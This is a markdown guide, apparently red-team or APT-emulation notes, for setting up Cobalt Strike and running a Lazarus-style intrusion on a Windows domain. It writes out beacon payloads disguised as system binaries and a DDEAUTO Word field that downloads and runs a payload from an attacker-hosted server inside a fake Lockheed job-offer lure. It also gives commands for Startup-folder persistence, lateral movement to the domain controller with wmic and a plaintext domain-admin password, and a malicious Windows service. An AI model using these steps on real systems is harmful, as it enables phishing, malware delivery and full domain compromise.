# **Setting up Cobaltstrike**

* Be root for the setup process.
```md
> sudo su
```
## Start Python3 http.server.
```md
> mkdir Downloads/beacons
> cd Downloads/beacons
> python3 -m http.server 8000
```
>***Note: This will be where your payloads are hosted. Or you could just host them through your cobalt strike instance which is simple. Figure it out yourself.***
## Start a team server
   *  (must be root / Sudo su) 

```md
> cd /usr/bin/cobaltstrike
> ip -br a
> ./teamserver <Ip_address> <password> 
# In a new tab, run the following commands to connect to the team server:
> cd /usr/bin/cobaltstrike
> ./cobaltstrike
# A prompt will appear
```
* Enter the `<eth1_ip_address>` of the teamserver and `password` in the appropriate boxes.

>***The User field can be changed to the name of the kali box, but it is unnecessary.***
* Click `Connect` then click Yes.

## Configure listeners

* Select the `Listeners` tab within the Cobalt Strike GUI. 
* Select `Add` at the bottom of the tab. A prompt will appear with the following options: 
  * Name: Enter the type of listener you are setting up. (HTTP)
  * Payload: Select the payload (.exe)
  * Hosts: Add hosts by clicking on the plus sign. A small prompt will appear.
  * Host(Stager): Type the domain set in your DNS server.
  * Profile: Default
  * Click Save


>***Note: SMB does not have these options.  Accept the defaults.***
## Build the payloads
* Select `Attacks` on the Menu Bar and then select `Packages`.
* Select the appropriate beacon type based on the table above.
* Select the "..." button next to “listener” and select the listener based on the table.
* Select the output based on the table above.
* Click on Generate
* Save the executable to the /root/Downloads/beacons directory using `"mss.exe"`
  * Repeat the above steps and name the next payloads `"mmc.exe and wuaueng.exe only make wuaueng a service executable"`

>***Note: Check the box x64: Use x64 payload (Since we know we are on windows 10 machines and x64 will be less prone to breaking)*** 

# **APT Lazarus**
***This APT is known to use Cobalt Strike***
* Browse to, Save, and Run mmc.exe on BLDG1-2-WS9 under user david.gercak (Domain Admin).
* Host your file using CS file host feature in attacks
* In microsoft word Create a word document on a victim machine and go to Insert > Quick Parts > Field… > Select “Formula” > Click “Ok:
* Add some random text(make it about a job offer/opportunity from Lockheed)
Highlight the text just added and Click “Toggle Field Codes”

* Paste: {DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Invoke-WebRequest 'http://[IP:PORT/mmc.exe]' -Outfile 'C:\\Users\\david.gercak\\Desktop\\mmc.exe'; powershell.exe .\\C:\\Users\\david.gercak\\Desktop\\mmc.exe #"Manager Position"}
* save it and email it to david.gercak from a user of your choice
  * Once the beacon calls back interact with it and enter the following commands at an interval of your choice.

## Inside of the Initial beacon ( mmc.exe ) 

```md
> cd "C:\Users\david.gercak\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
> upload mss.exe
> powerpick ipconfig
> powerpick C:\Windows\System32\cmd.exe nltest/dsgetdc:meetech.com
# Used to discover the DC

> powerpick copy mss.exe "\\<IP of the DC>\C$\Users\david.gercak\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
# Copied over mss.exe to the DC's startup folder
> powerpick wmic /node:<ip of the DC>/user:david.gercak/password:Wc3MpE1+WoNta4Ef4 process call create "\\<IP of the DC>\C$\Users\david.gercak\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mss.exe"
# Remotely started mss.exe on the DC
> link 11.25.15.2
```
## Inside the Link ( Now on the DC )
```md
> upload wuaueng.exe
# Make sure wuaueng.exe is a Windows Service Executable
> powerpick copy wuaueng.exe "C:\Windows\Temp\"
> powerpick sc.exe create <new_service_name> binPath= "C:\Windows\Temp\wuaueng.exe"
# Creates the service
> powerpick get-service -Name <service name>
# Make sure the service was created
> powerpick cmd.exe net start <service name>
# Start the service
```

>***Note:Macro embed this docx - Lockheed_Martin_JobOpportunities.docx***